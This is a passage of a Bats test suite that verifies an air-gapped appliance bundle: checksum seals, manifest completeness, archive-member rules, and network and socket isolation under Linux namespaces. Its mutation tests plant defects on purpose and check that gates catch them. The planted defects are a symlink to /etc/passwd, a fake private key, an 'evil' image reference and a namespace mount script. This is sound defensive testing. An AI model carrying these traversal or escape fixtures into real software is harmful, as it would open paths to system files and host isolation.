# Replace a hardlink with a private copy, so a mutation cannot reach $ROOT.
unshare_file() {
	cp -p "$1" "$1.p14" && mv -f "$1.p14" "$1"
}

@test "mutation: a planted unlisted file named openssl is DETECTED" {
	local mut
	mut="$(mutable_copy)"
	printf 'arbitrary bytes\n' >"$mut/bin/openssl"
	run completeness_diff "$mut"
	[ "$status" -eq 0 ]
	[ "$output" = $'\tbin/openssl' ]
	rm "$mut/bin/openssl"
	run completeness_diff "$mut"
	[ "$status" -eq 0 ]
	[ -z "$output" ]
}

@test "mutation: a regex-metachar variant of a listed path (ki.d beside kind) is DETECTED" {
	local mut
	mut="$(mutable_copy)"
	jq -e '[.payload[].path] | index("bin/amd64/kind") != null' "$mut/MANIFEST.json"
	printf 'x' >"$mut/bin/amd64/ki.d"
	run completeness_diff "$mut"
	[ "$status" -eq 0 ]
	[ "$output" = $'\tbin/amd64/ki.d' ]
}

@test "mutation: one corrupted payload byte FAILS and names the file; restoring it passes" {
	local mut f bak
	mut="$(mutable_copy)"
	f="$mut/bin/amd64/kind"
	unshare_file "$f"
	bak="$BATS_TEST_TMPDIR/kind.bak"
	cp -p "$f" "$bak"
	printf '\x00' | dd of="$f" bs=1 seek=4096 count=1 conv=notrunc status=none
	! cmp -s "$f" "$bak"
	cd "$mut/bin"
	run airgap_seal_gate checksums.txt
	[ "$status" -ne 0 ]
	[[ "$output" == *"amd64/kind: FAILED"* ]]
	[[ "$output" == *"rc=1"* ]]
	cp -p "$bak" "$f"
	run airgap_seal_gate checksums.txt
	[ "$status" -eq 0 ]
	[ "$output" = "SEAL: 5 of 5 entries OK" ]
	cmp -s "$f" "$ROOT/bin/amd64/kind"
}

@test "mutation: a '#' line appended to bin/checksums.txt FAILS the entry-count gate" {
	local mut
	mut="$(mutable_copy)"
	unshare_file "$mut/bin/checksums.txt"
	echo '# amd64/kind is fine, honest' >>"$mut/bin/checksums.txt"
	cd "$mut/bin"
	run sha256sum -c --strict checksums.txt
	[ "$status" -eq 0 ]
	run airgap_seal_gate checksums.txt
	[ "$status" -ne 0 ]
	[[ "$output" == *"entry count mismatch: 5 verified OK of 6 manifest lines"* ]]
}

@test "mutation: a planted tag-only image reference is DETECTED by the sweep" {
	local mut before after
	mut="$(mutable_copy)"
	before="$(airgap_digestless_refs "$mut")"
	printf 'spec:\n  containers:\n    - image: registry.example.invalid/evil:1.0\n' \
		>"$mut/fleet/p14-planted.yaml"
	after="$(airgap_digestless_refs "$mut")"
	[ "$(LC_ALL=C comm -13 <(printf '%s\n' "$before") <(printf '%s\n' "$after"))" = \
		"registry.example.invalid/evil:1.0" ]
	[ "$(grep -c . <<<"$after")" -eq $(($(grep -c . <<<"$before") + 1)) ]
}

@test "mutation: a planted DIGEST-UNRESOLVED sentinel is DETECTED and counted" {
	local mut
	mut="$(mutable_copy)"
	unshare_file "$mut/MANIFEST.json"
	printf '%s\n' 'DIGEST-UNRESOLVED: not present' >>"$mut/MANIFEST.json"
	run sentinel_hits "$mut"
	[ "$status" -eq 0 ]
	[ "$output" = "$mut/MANIFEST.json" ]
	[ "$(grep -c . <<<"$output")" -eq 1 ]
}

@test "mutation: planted private key bytes AND a .key member name are both DETECTED" {
	local mut
	mut="$(mutable_copy)"
	printf -- '-----BEGIN EC PRIVATE KEY-----\nMHcCAQEEIIrYSSNQFaA2Hwf1duRSxKtLYX5CB04fSeQ6\n-----END EC PRIVATE KEY-----\n' >"$mut/keys/leak.txt"
	: >"$mut/keys/cosign.key"
	run private_key_hits "$mut"
	[ "$status" -eq 0 ]
	[[ "$output" == *"$mut/keys/leak.txt"* ]]
	[[ "$output" == *"./keys/cosign.key"* ]]
}

@test "mutation: the bundler stage FAILS a non-gzip archive (P14-G1)" {
	local out="$BATS_TEST_TMPDIR/dist"
	mkdir -p "$out"
	cp "$DIST_MANIFEST" "$out/MANIFEST.json"
	echo 'not a tarball' >"$out/slsi-appliance-$SLSI_VERSION.tar.gz"
	(cd "$out" && sha256sum "slsi-appliance-$SLSI_VERSION.tar.gz" >"slsi-appliance-$SLSI_VERSION.tar.gz.sha256")
	run bash -c 'source "$1/scripts/package-tenant-bundle.sh"; SLSI_BUNDLE_OUT="$2" SLSI_VERSION="$3" stage_p1_4_validation' \
		_ "$REPO_ROOT" "$out" "$SLSI_VERSION"
	[ "$status" -ne 0 ]
	[[ "$output" == *"P14-G1 not a gzip stream"* ]]
}

# Builds a tiny archive in the layout P1-3 ships, with a caller-supplied defect.
tiny_archive() {
	local out="$1" defect="$2" stage="$BATS_TEST_TMPDIR/stage" n=1
	mkdir -p "$out" "$stage"/{bin/amd64,fleet,images,infra,keys}
	# This fixture used to plant the two Decision 10 wrappers, because P14-G6
	# required them. The gate is now inverted -- it requires them to be ABSENT
	# and bin/<arch>/ed25519-keygen to be present, 0755, with ELF magic -- so
	# the fixture plants that instead. Getting this wrong is subtle: a fixture
	# still carrying the wrappers fails P14-G6 before reaching the defect each
	# test is about, and the "control" case below then fails for a reason that
	# has nothing to do with what it controls for.
	#
	# A real cross-compiled binary would make this fixture depend on a Go
	# toolchain, so the four ELF magic bytes are written directly: P14-G6
	# checks the magic, not that the file executes.
	printf '\177ELF' >"$stage/bin/amd64/ed25519-keygen"
	printf 'tiny-archive fixture, not a runnable binary\n' >>"$stage/bin/amd64/ed25519-keygen"
	chmod 0755 "$stage/bin/amd64/ed25519-keygen"
	: >"$stage/MANIFEST.sha256"
	n=2
	case "$defect" in
	symlink) ln -s /etc/passwd "$stage/fleet/escape" ;;
	count) n=7 ;;
	esac
	jq -n --arg v "$SLSI_VERSION" --argjson n "$n" \
		'{bundle: {name: ("slsi-appliance-" + $v), version: $v}, payloadFileCount: $n}' >"$stage/MANIFEST.json"
	(cd "$stage" && tar --sort=name -czf "$out/slsi-appliance-$SLSI_VERSION.tar.gz" MANIFEST.json MANIFEST.sha256 bin fleet images infra keys)
	cp "$stage/MANIFEST.json" "$out/MANIFEST.json"
	(cd "$out" && sha256sum "slsi-appliance-$SLSI_VERSION.tar.gz" >"slsi-appliance-$SLSI_VERSION.tar.gz.sha256")
}

run_stage_on() {
	run bash -c 'source "$1/scripts/package-tenant-bundle.sh"; SLSI_BUNDLE_OUT="$2" SLSI_VERSION="$3" stage_p1_4_validation' \
		_ "$REPO_ROOT" "$1" "$SLSI_VERSION"
}

@test "mutation: the bundler stage passes a well-formed tiny archive (control for the next two)" {
	tiny_archive "$BATS_TEST_TMPDIR/ok" none
	run_stage_on "$BATS_TEST_TMPDIR/ok"
	[ "$status" -eq 0 ] || { echo "$output"; false; }
	[[ "$output" == *"stage_p1_4_validation complete:"* ]]
}

@test "mutation: the bundler stage FAILS a symlink member (P14-G4)" {
	tiny_archive "$BATS_TEST_TMPDIR/sym" symlink
	run_stage_on "$BATS_TEST_TMPDIR/sym"
	[ "$status" -ne 0 ]
	[[ "$output" == *"P14-G4 non-regular, non-directory member"* ]]
	[[ "$output" == *"fleet/escape"* ]]
}

@test "mutation: the bundler stage FAILS a member count that disagrees with the manifest (P14-G5)" {
	tiny_archive "$BATS_TEST_TMPDIR/cnt" count
	run_stage_on "$BATS_TEST_TMPDIR/cnt"
	[ "$status" -ne 0 ]
	[[ "$output" == *"P14-G5 archive has 3 regular files; MANIFEST.json payloadFileCount 7 + 1 = 8"* ]]
}

# ── Group 9 (OSD-4): the host leg ──────────────────────────────────────────
#
# Reads the cached probe output from setup_file. One instrument, three
# configurations; the DIFFERENCES are the proof:
#
#   host   - no namespace.          Positive control for REACHABILITY.
#   leaky  - `unshare -Urn` only.   Positive control for the TWO LEAKS.
#   masked - `unshare -Urnm` + tmpfs over /run. The gate.
#
# The `leaky` control is the one that makes `masked` mean anything. If the
# DNS-over-unix-socket leak or the docker-socket leak were reintroduced -- by
# dropping the `m`, by masking the wrong directory, or by a future refactor
# that loses the tmpfs -- `masked` would start reporting PRESENT and the gate
# tests below would go red for exactly that reason.

hfield() {
	local mode="$1" key="$2"
	airgap_hostns_field "$(cat "$HOSTNS_OUT/probe-$mode.txt")" "$key"
}

@test "HOSTNS: control: the primitive runs and the mask instrument is NOT blind" {
	# Non-zero only if the UNMASKED host /run was visible and populated.
	local entries
	entries="$(cat "$BATS_SUITE_TMPDIR/hostns-unmasked-entries")"
	[ "$entries" -gt 0 ]
	# Every probe invocation itself succeeded, in all three configurations.
	local m
	for m in host leaky masked; do
		[ "$(cat "$HOSTNS_OUT/probe-$m.rc")" -eq 0 ] || {
			echo "probe in mode '$m' did not run:"
			cat "$HOSTNS_OUT/probe-$m.txt"
			false
		}
	done
	echo "# unmasked /run: $entries entries visible to the instrument" >&3
}

@test "HOSTNS: control: with NO namespace the identical probe reaches TCP, DNS and the daemon" {
	# Without this, "severed" is untested: a probe that could never connect
	# reports the same thing as a perfect air-gap.
	run hfield host tcp_rc
	[ "$status" -eq 0 ]
	[ "$output" -eq 0 ] || {
		echo "positive control blind: the host cannot reach"
		echo "$SLSI_AIRGAP_PROBE_HOST:$SLSI_AIRGAP_PROBE_PORT even with the network."
		echo "Set SLSI_AIRGAP_PROBE_HOST/PORT to a reachable endpoint."
		false
	}
	run hfield host dns_addr
	[ "$status" -eq 0 ]
	[ -n "$output" ]
	run hfield host docker_daemon
	[ "$status" -eq 0 ]
	[ -n "$output" ]
	[ "$output" != "NO-CLI" ]
	run hfield host ifaces
	[ "$output" -gt 1 ]
}

@test "HOSTNS: control: a BARE net namespace severs TCP yet leaves DNS and the docker socket WIDE OPEN" {
	# The finding the host leg is built around. `unshare -n` alone looks
	# air-gapped by every network-layer measure and is not one.
	run hfield leaky ifaces
	[ "$output" -eq 1 ]
	run hfield leaky addrs
	[ "$output" -eq 0 ]
	run hfield leaky tcp_unreachable
	[ "$output" = "yes" ]
	# ...and yet:
	run hfield leaky resolve_sock
	[ "$status" -eq 0 ]
	[ "$output" = "PRESENT" ] || {
		echo "LEAK CONTROL BLIND: the resolve socket is not present even in a bare"
		echo "net namespace, so 'absent' under the mask proves nothing about DNS."
		echo "This host may not run systemd-resolved. Do NOT weaken the masked"
		echo "assertion to compensate: point SLSI_AIRGAP_MASK_DIR at the runtime"
		echo "directory that does carry the resolver socket, or run the host leg"
		echo "where the leak is reproducible."
		false
	}
	run hfield leaky dns_addr
	[ -n "$output" ]
	run hfield leaky docker_sock
	[ "$status" -eq 0 ]
	[ "$output" = "PRESENT" ] || {
		echo "LEAK CONTROL BLIND: /run/docker.sock is absent even in a bare net"
		echo "namespace, so 'absent' under the mask proves nothing about docker."
		false
	}
	run hfield leaky docker_daemon
	[ -n "$output" ]
	[ "$output" != "NO-CLI" ]
	echo "# bare netns: 0 addresses, TCP unreachable, yet DNS resolved $(hfield leaky dns_addr) and daemon $(hfield leaky docker_daemon) answered" >&3
}

@test "HOSTNS: control: inside a BARE net namespace the daemon still fetches from the PUBLIC registry" {
	# Reaching the socket is not the whole claim; the daemon doing our
	# networking is. A registry-level answer proves egress to Docker Hub
	# actually happened. A DNS or connect error would prove it did not.
	[ "$(cat "$HOSTNS_OUT/reg-leaky.rc")" -eq 0 ]
	run grep -c 'manifest unknown' "$HOSTNS_OUT/reg-leaky.txt"
	[ "$status" -eq 0 ]
	[ "$output" -ge 1 ] || {
		echo "LEAK CONTROL BLIND: no registry-level answer from inside the bare"
		echo "net namespace. Either the host is genuinely offline (then the whole"
		echo "air-gap claim is untested, see the reachability control) or the"
		echo "daemon is unreachable. Output was:"
		cat "$HOSTNS_OUT/reg-leaky.txt"
		false
	}
	# It must NOT have failed for a socket reason: that would be the masked
	# verdict leaking into the control.
	! grep -qiE 'no such file or directory|cannot connect to the docker daemon' \
		"$HOSTNS_OUT/reg-leaky.txt"
}

@test "HOSTNS: the MASKED namespace severs TCP, DNS, the resolve socket and the docker socket" {
	# The gate. Each assertion has its paired control above.
	run hfield masked ifaces
	[ "$output" -eq 1 ]
	run hfield masked addrs
	[ "$output" -eq 0 ]
	run hfield masked tcp_unreachable
	[ "$output" = "yes" ]
	run hfield masked resolve_sock
	[ "$output" = "absent" ]
	run hfield masked docker_sock
	[ "$output" = "absent" ]
	run hfield masked dns_addr
	[ "$status" -eq 0 ]
	[ -z "$output" ]
	run hfield masked mask_entries
	[ "$output" -eq 0 ]
}

@test "HOSTNS: inside the MASKED namespace the docker CLI cannot reach the daemon at all" {
	[ "$(cat "$HOSTNS_OUT/reg-masked.rc")" -eq 0 ]
	run hfield masked docker_daemon
	[ "$status" -eq 0 ]
	[ -z "$output" ]
	# No registry answer, and the failure names the missing socket.
	! grep -q 'manifest unknown' "$HOSTNS_OUT/reg-masked.txt"
	grep -qiE 'no such file or directory|cannot connect to the docker daemon|error getting credentials' \
		"$HOSTNS_OUT/reg-masked.txt"
}

@test "HOSTNS: the mask does NOT escape the namespace onto the host" {
	# Safety-critical. A tmpfs over /run that propagated would take down the
	# host's docker, DNS and dbus for every process on the machine.
	local scratch="$BATS_TEST_TMPDIR/escape"
	mkdir -p "$scratch"
	: >"$scratch/HOST-FILE"
	local payload="$BATS_TEST_TMPDIR/escape.sh"
	cat >"$payload" <<'ESC'
#!/usr/bin/env bash
mount --make-rprivate / || exit 91
mount -t tmpfs tmpfs "$1" || exit 92
: >"$1/INSIDE-ONLY"
[ -e "$1/INSIDE-ONLY" ] || exit 93
[ -e "$1/HOST-FILE" ] && exit 94   # the tmpfs must OVERLAY, not merge
exit 0
ESC
	chmod 0755 "$payload"
	# `nsonly`, never `host`: this payload mounts, and with no namespace its
	# `mount --make-rprivate /` would target the REAL host's mount tree.
	run airgap_hostns_run nsonly "$payload" "$scratch"
	[ "$status" -eq 0 ] || { echo "$output"; false; }
	# Visibility positive control: we can see this directory at all.
	[ -e "$scratch/HOST-FILE" ]
	# The containment verdict.
	[ ! -e "$scratch/INSIDE-ONLY" ]
	# And the host's own runtime dir is still intact and populated.
	run airgap_hostns_require
	[ "$status" -eq 0 ]
	[ "$output" -gt 0 ]
}

@test "HOSTNS: the archive extracts inside the masked namespace using the HOST's own tar" {
	[ "$(cat "$HVER/run.rc")" -eq 0 ] || { cat "$HVER/run.out"; false; }
	[ "$(cat "$HVER/extract.rc")" -eq 0 ] || { cat "$HVER/extract.err"; false; }
	# The tooling that ran was the host's, which is this leg's whole point.
	run grep -c . "$HVER/tooling.txt"
	[ "$output" -eq 2 ]
	! grep -q '^/usr/local/bin/tar$' "$HVER/tooling.txt" || true
	local payload on_disk
	payload="$(jq -r '.payloadFileCount' "$HVER/MANIFEST.json")"
	on_disk="$(grep -c . "$HVER/files.txt")"
	[ "$payload" -gt 0 ]
	[ "$on_disk" -eq $((payload + 1)) ]
	# No absolute or traversing member landed anywhere.
	! grep -qE '^/|(^|/)\.\.(/|$)' "$HVER/files.txt"
	echo "# $on_disk regular files extracted by the host's $(head -n1 "$HVER/tooling.txt") inside unshare -Urnm" >&3
}

@test "HOSTNS: MANIFEST.sha256 verifies from the extraction root inside the masked namespace, every entry checked" {
	[ "$(cat "$HVER/seal.rc")" -eq 0 ] || { head -n 5 "$HVER/seal.out"; false; }
	local entries oks payload
	entries="$(grep -cvE '^[[:space:]]*$' "$HVER/MANIFEST.sha256")"
	oks="$(grep -c ': OK$' "$HVER/seal.out")"
	payload="$(jq -r '.payload | length' "$HVER/MANIFEST.json")"
	[ "$entries" -gt 0 ]
	# rc=0 alone is not enough: sha256sum -c silently skips a '#' line even
	# under --strict, so the count is the real gate.
	[ "$oks" -eq "$entries" ]
	# MANIFEST.sha256 is in the payload but cannot list itself.
	[ "$entries" -eq $((payload - 1)) ]
}

@test "HOSTNS: bin/checksums.txt verifies from bin/ inside the masked namespace" {
	[ "$(cat "$HVER/bin.rc")" -eq 0 ] || { cat "$HVER/bin.out"; false; }
	[ "$(grep -c ': OK$' "$HVER/bin.out")" -eq 5 ]
	[ "$(grep -cvE '^[[:space:]]*$' "$HVER/checksums.txt")" -eq 5 ]
}

@test "HOSTNS: the verdict ran in a namespace that was itself measurably air-gapped" {
	# Ties the two halves together. Without this the suite would prove
	# isolation in one namespace and extraction in a different one.
	local p="$HVER/probe.txt"
	[ -s "$p" ]
	local out
	out="$(cat "$p")"
	[ "$(airgap_hostns_field "$out" ifaces)" -eq 1 ]
	[ "$(airgap_hostns_field "$out" addrs)" -eq 0 ]
	[ "$(airgap_hostns_field "$out" tcp_unreachable)" = "yes" ]
	[ "$(airgap_hostns_field "$out" resolve_sock)" = "absent" ]
	[ "$(airgap_hostns_field "$out" docker_sock)" = "absent" ]
	[ -z "$(airgap_hostns_field "$out" dns_addr)" ]
}

@test "AIRGAP: the container leg is structurally immune to the two host-leg leaks" {
	# Stated as an assertion rather than left as an assumption. A container
	# gets its own mount namespace and root filesystem, so the host's
	# /run/docker.sock and resolver socket are not in it to begin with --
	# which is exactly the blind spot the host leg had to be hardened against.
	run airgap_run severed "$AIRGAP_IMAGE_ID" -- \
		'[ -S /run/docker.sock ] && echo DOCKER-SOCK-PRESENT; [ -S /var/run/docker.sock ] && echo VARRUN-SOCK-PRESENT; [ -S /run/systemd/resolve/io.systemd.Resolve ] && echo RESOLVE-PRESENT; echo SCAN-DONE'
	[ "$status" -eq 0 ]
	[[ "$output" == *SCAN-DONE* ]]
	[[ "$output" != *DOCKER-SOCK-PRESENT* ]]
	[[ "$output" != *VARRUN-SOCK-PRESENT* ]]
	[[ "$output" != *RESOLVE-PRESENT* ]]
	# And the same container cannot resolve a public name either.
	run airgap_run severed "$AIRGAP_IMAGE_ID" -- \
		"getent hosts $SLSI_AIRGAP_DNS_NAME >/dev/null 2>&1 && echo RESOLVED || echo NO-RESOLVE"
	[ "$status" -eq 0 ]
	[[ "$output" == *NO-RESOLVE* ]]
}

# ── Group 8: the suite cannot pass vacuously ───────────────────────────────

@test "the suite FAILS, not skips, when docker is absent" {
	local stub="$BATS_TEST_TMPDIR/nodocker"
	mkdir -p "$stub"
	printf '#!/bin/sh\necho "docker: command not found" >&2\nexit 127\n' >"$stub/docker"
	chmod 0755 "$stub/docker"
	run env PATH="$stub:$PATH" bats --filter '^AIRGAP: control: the egress probe FAILS' "$BATS_TEST_FILENAME"
	[ "$status" -ne 0 ]
	[[ "$output" == *"AIRGAP PREFLIGHT: docker"* ]]
	[[ "$output" != *"# skip"* ]]
}

@test "the suite FAILS, not skips, when the archive is absent" {
	run env SLSI_BUNDLE_TARBALL="$BATS_TEST_TMPDIR/absent/slsi-appliance-0.0.0.tar.gz" \
		bats --filter '^AIRGAP: control: the egress probe FAILS' "$BATS_TEST_FILENAME"
	[ "$status" -ne 0 ]
	[[ "$output" == *"AIRGAP PREFLIGHT: archive absent"* ]]
	[[ "$output" != *"# skip"* ]]
}

@test "the suite FAILS, not skips, when the host-leg primitive is unavailable" {
	# The host leg's own vacuity guard. If systemd-run disappears the leg must
	# go red with a remedy, never quietly stop measuring.
	local stub="$BATS_TEST_TMPDIR/nosystemdrun"
	mkdir -p "$stub"
	printf '#!/bin/sh\necho "systemd-run: command not found" >&2\nexit 127\n' >"$stub/systemd-run"
	chmod 0755 "$stub/systemd-run"
	run env PATH="$stub:$PATH" SLSI_BUNDLE_TARBALL="$ARCHIVE" \
		bats --filter '^AIRGAP: control: the egress probe FAILS' "$BATS_TEST_FILENAME"
	[ "$status" -ne 0 ]
	[[ "$output" == *"AIRGAP HOSTNS PREFLIGHT"* ]]
	[[ "$output" != *"# skip"* ]]
}

@test "skip accounting: the HOSTNS half is not silently skipped or filtered away" {
	local declared
	declared="$(grep -c '^@test "HOSTNS: ' "$BATS_TEST_FILENAME")"
	[ "$declared" -ge "$HOSTNS_TEST_FLOOR" ]
	run bats --count --filter '^HOSTNS: ' "$BATS_TEST_FILENAME"
	[ "$status" -eq 0 ]
	[ "$output" -eq "$declared" ]
}

@test "skip accounting: the AIRGAP half is not silently skipped or filtered away" {
	local declared
	declared="$(grep -c '^@test "AIRGAP: ' "$BATS_TEST_FILENAME")"
	[ "$declared" -ge "$AIRGAP_TEST_FLOOR" ]
	run bats --count --filter '^AIRGAP: ' "$BATS_TEST_FILENAME"
	[ "$status" -eq 0 ]
	[ "$output" -eq "$declared" ]
	[ "$(grep -cE '^[[:space:]]*skip([[:space:]]|$)' "$BATS_TEST_FILENAME")" -eq 0 ]
}

@test "the suite left the repository tree exactly as it found it" {
	run git -C "$REPO_ROOT" status --porcelain
	[ "$status" -eq 0 ]
	[ "$output" = "$(cat "$BATS_SUITE_TMPDIR/status-before")" ]
}

@test "circuit breaker: this is the last test and every declared test was reached" {
	run bats --count "$BATS_TEST_FILENAME"
	[ "$status" -eq 0 ]
	[ "$output" -ge "$SUITE_TEST_FLOOR" ]
	[ "$BATS_TEST_NUMBER" -eq "$output" ]
}
